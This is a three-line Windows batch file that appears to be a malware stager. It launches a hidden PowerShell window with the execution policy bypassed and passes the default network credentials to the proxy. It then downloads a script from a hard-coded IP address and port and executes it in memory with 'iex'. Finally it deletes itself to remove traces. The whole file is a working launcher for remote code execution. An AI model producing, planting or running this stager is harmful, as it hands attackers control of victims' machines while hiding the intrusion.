@echo off
start powershell.exe -nol -w 1 -nop -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.154.128:63/download/powershell/')-UseBasicParsing|iex
(goto) 2>nul & del "%~f0"
